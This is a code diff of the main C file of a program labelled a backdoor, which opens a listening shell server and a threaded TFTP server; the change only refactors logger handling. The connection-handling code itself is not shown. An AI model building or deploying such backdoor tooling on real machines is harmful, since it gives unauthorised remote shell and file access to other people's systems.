@@ -13,18 +13,13 @@
 
 #define PTHREAD_CREATE_SUCCESS (0)
 
-typedef struct start_tftp_server_args_s {
-    logger__log_t *logger;
-    int32_t tftp_server_socket;
-} start_tftp_server_args_t;
-
 static void *start_tftp_server(void *arg)
 {
     assert(arg != NULL);
     return_code_t result = RC_UNINITIALIZED;
-    start_tftp_server_args_t *start_tftp_args = arg;
+    int32_t tftp_server = *((int32_t *)arg);
 
-    result = tftp__run_server(start_tftp_args->tftp_server_socket, start_tftp_args->logger);
+    result = tftp__run_server(tftp_server);
     if (RC_SUCCESS != result){
         goto l_cleanup;
     }
@@ -34,13 +29,12 @@ l_cleanup:
     return (void *)result;
 }
 
-static return_code_t run_shell_server(int32_t shell_server_socket, logger__log_t *logger)
+static return_code_t run_shell_server(int32_t shell_server_socket)
 {
-    assert(logger != NULL);
     return_code_t result = RC_UNINITIALIZED;
 
     while (true){
-        result = shell__handle_new_connection(shell_server_socket, logger);
+        result = shell__handle_new_connection(shell_server_socket);
         if (RC_SUCCESS != result){
             goto l_cleanup;
         }
@@ -53,45 +47,41 @@ l_cleanup:
 int main(void)
 {
     return_code_t result = RC_UNINITIALIZED;
-    logger__log_t logger = {0};
     int32_t shell_server = -1;
     int32_t tftp_server = -1;
     pthread_t tftp_tid = 0;
     int32_t temp_result = -1;
-    start_tftp_server_args_t start_tftp_args = {0};
 
-    result = logger__init_logger(LOG_PATH, &logger);
+    result = logger__init_logger(LOG_PATH);
     if (RC_SUCCESS != result){
         goto l_cleanup;
     }
 
-    result = shell__init_server(SHELL_LISTENING_PORT, &logger, &shell_server);
+    result = shell__init_server(SHELL_LISTENING_PORT, &shell_server);
     if (RC_SUCCESS != result){
         goto l_cleanup;
     }
 
-    result = tftp__init_server(TFTP_REQUESTS_PORT, &logger, &tftp_server);
+    result = tftp__init_server(TFTP_REQUESTS_PORT, &tftp_server);
     if (RC_SUCCESS != result){
         goto l_cleanup;
     }
 
-    start_tftp_args.logger = &logger;
-    start_tftp_args.tftp_server_socket = tftp_server;
-    temp_result = pthread_create(&tftp_tid, NULL, &start_tftp_server, &start_tftp_args);
+    temp_result = pthread_create(&tftp_tid, NULL, &start_tftp_server, (void *)&tftp_server);
     if (PTHREAD_CREATE_SUCCESS != temp_result){
         handle_perror("Pthread create failed", RC_BACKDOOR__MAIN__PTHREAD_CREATE_FAILED);
     }
 
-    result = run_shell_server(shell_server, &logger);
+    result = run_shell_server(shell_server);
 
 l_cleanup:
     if (-1 != shell_server){
-        shell__destroy_server(&shell_server, &logger);
+        shell__destroy_server(&shell_server);
     }
     if (-1 != tftp_server){
-        tftp__destroy_server(&tftp_server, &logger);
+        tftp__destroy_server(&tftp_server);
     }
-    logger__destory_logger(&logger);
+    logger__destory_logger();
     
     return (int)result;
 }
